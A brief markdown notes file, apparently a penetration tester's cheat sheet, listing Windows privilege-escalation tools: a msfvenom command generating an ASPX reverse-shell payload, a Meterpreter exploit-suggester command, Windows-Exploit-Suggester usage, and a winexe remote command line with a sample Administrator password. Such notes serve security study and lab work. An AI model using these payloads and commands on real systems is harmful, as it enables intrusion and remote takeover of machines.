# Tools
-------------

winpeas requires .NET 4.0 or greater

Generating a msfvenom payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST= RHOST= -f aspx > payload.aspx

```

## Metasploit Exploit Suggester

```bash
meterpreter> run post/multi/recon/local_exploit_suggester
```

## Windows Exploit Suggester 
- (https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- copy contents from metasploit exploit suggester (.xls) and systeminfo (.txt) and pass it to the script

## winexe 
- [ ] check how to install winexe in ubuntu
- winexe is used to execute windows commands from linux 

```bash
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
```


